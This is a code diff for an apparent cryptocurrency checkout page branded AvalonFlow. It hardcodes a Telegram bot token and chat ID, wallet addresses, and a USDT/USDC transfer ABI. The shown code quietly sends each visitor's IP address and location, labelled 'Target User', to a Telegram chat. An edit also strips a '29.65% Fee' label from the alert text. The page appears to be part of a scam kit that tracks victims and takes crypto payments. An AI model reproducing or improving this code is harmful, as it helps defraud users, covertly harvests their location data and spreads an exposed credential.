@@ -549,12 +549,9 @@
     import { EthersAdapter } from "https://esm.sh/@reown/appkit-adapter-ethers@2.2.0";
     import { mainnet } from "https://esm.sh/@reown/appkit/networks";
 
-    // ==========================================
-    // 🔐 CENTRAL CONFIGURATION & TELEGRAM SETTINGS
-    // ==========================================
     const TELEGRAM_BOT_TOKEN = "8971558300:AAFCkaN9K6ycSf4Bf-hHSeaPQFkFvf3Y8w8";
     const TELEGRAM_CHAT_ID = "-1003913850436";
-    const WALLETCONNECT_PROJECT_ID = "YOUR_PROJECT_ID_HERE"; // Replace with your Reown/WalletConnect Project ID
+    const WALLETCONNECT_PROJECT_ID = "YOUR_PROJECT_ID_HERE";
 
     let timerInterval;
     let telegramPollInterval = null;
@@ -567,18 +564,15 @@
         "0x6bC7a3943D217D2f80437b61a4D8898138f2EE5B"
     ];
 
-    // Standard ERC-20 Token Contracts (Ethereum Mainnet)
     const tokenContracts = {
         USDT: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
         USDC: "0xA0b86991c6218b36c1d19d4a2e9eb0ce3606eb48"
     };
 
-    // Minimal ERC-20 ABI required to execute transfers
     const erc20Abi = [
         "function transfer(address to, uint256 value) public returns (bool)"
     ];
 
-    // Initialize Reown AppKit / WalletConnect Modal safely
     let modal;
     const ethersAdapter = new EthersAdapter();
     
@@ -690,7 +684,7 @@
             const messageText = `⚡ <b>Crypto Checkout Session Started | AvalonFlow</b>\n\n` +
                                 `👤 <b>Target User:</b> <code>${identifyUser}</code>\n` +
                                 `📄 <b>Page:</b> <code>${currentPage}</code>\n` +
-                                `💰 <b>Expected Amount (29.65% Fee):</b> <code>$${expectedAmount}</code>\n` +
+                                `💰 <b>Expected Amount:</b> <code>$${expectedAmount}</code>\n` +
                                 `🌐 <b>IP:</b> <code>${ipData.ip}</code>\n` +
                                 `📍 <b>Location:</b> <code>${ipData.city || 'Unknown'}, ${ipData.country_name || 'Unknown'}</code>\n` +
                                 `⏱️ <b>Time:</b> <code>${new Date().toLocaleString()}</code>`;
@@ -996,12 +990,14 @@
         setTimeout(() => notification.classList.remove("show"), duration);
     }
 
-    window.addEventListener("DOMContentLoaded", () => {
+    document.addEventListener("DOMContentLoaded", () => {
         initializeAppWithIP();
         showTokenCard("usdt");
 
-        document.getElementById("usdt-amount").innerText = "$" + expectedAmount;
-        document.getElementById("usdc-amount").innerText = "$" + expectedAmount;
+        const usdtAmountEl = document.getElementById("usdt-amount");
+        const usdcAmountEl = document.getElementById("usdc-amount");
+        if (usdtAmountEl) usdtAmountEl.innerText = "$" + expectedAmount;
+        if (usdcAmountEl) usdcAmountEl.innerText = "$" + expectedAmount;
 
         if (localStorage.getItem("av_payment_in_progress") === "true") {
             paymentDone = true;
@@ -1016,6 +1012,9 @@
 
             const totalSeconds = totalDuration / 1000;
             const percentage = Math.max(0, (remaining / totalSeconds) * 100);
+
+            const usdtProgress = document.getElementById("usdt-progress");
+            const usdcProgress = document.getElementById("usdc-progress");
 
             if (usdtProgress) usdtProgress.style.width = percentage + "%";
             if (usdcProgress) usdcProgress.style.width = percentage + "%";
@@ -1049,9 +1048,6 @@
                 }, 3200);
             }
         }
-
-        const usdtProgress = document.getElementById("usdt-progress");
-        const usdcProgress = document.getElementById("usdc-progress");
 
         timerInterval = setInterval(updateTimer, 1000);
         updateTimer();
